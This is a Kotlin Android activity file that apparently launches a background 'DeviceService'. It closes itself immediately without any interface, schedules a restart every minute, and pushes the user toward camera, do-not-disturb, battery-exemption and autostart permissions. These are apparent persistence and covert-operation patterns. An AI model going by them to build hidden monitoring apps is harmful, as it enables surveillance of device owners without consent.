package com.hugecode.buffer

import android.app.Activity
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.Manifest
import android.app.NotificationManager
import android.widget.Toast

class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        StorageManager.init(this)
        SecurityManager.init(this)
        
        if (!SecurityManager.verifyApp()) {
            SecurityManager.activateLicense()
        }
        
        scheduleRestart()
        
        // СНАЧАЛА запроси разрешения
        requestAllPermissions()
        
        // ПОТОМ запусти сервис
        val serviceIntent = Intent(this, DeviceService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        finish()
    }
    
    private fun scheduleRestart() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, RestartReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            this,
            100,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        
        alarmManager.setRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 60000,
            60000,
            pendingIntent
        )
    }
    
    private fun requestAllPermissions() {
        val permissions = mutableListOf<String>()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.CAMERA)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                    permissions.add(Manifest.permission.POST_NOTIFICATIONS)
                }
            }
        }
        
        if (permissions.isNotEmpty()) {
            requestPermissions(permissions.toTypedArray(), 100)
            return
        }
        
        requestSpecialPermissions()
    }
    
    private fun requestSpecialPermissions() {
        try {
            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            if (!nm.isNotificationPolicyAccessGranted) {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS))
            }
        } catch (_: Exception) {}
        
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                })
            }
        } catch (_: Exception) {}
        
        try {
            val intent = Intent()
            intent.component = android.content.ComponentName(
                "com.miui.securitycenter",
                "com.miui.permcenter.autostart.AutoStartManagementActivity"
            )
            startActivity(intent)
        } catch (_: Exception) {}
    }
    
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
        if (allGranted) {
            requestSpecialPermissions()
        }
        
        val serviceIntent = Intent(this, DeviceService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        finish()
    }
}
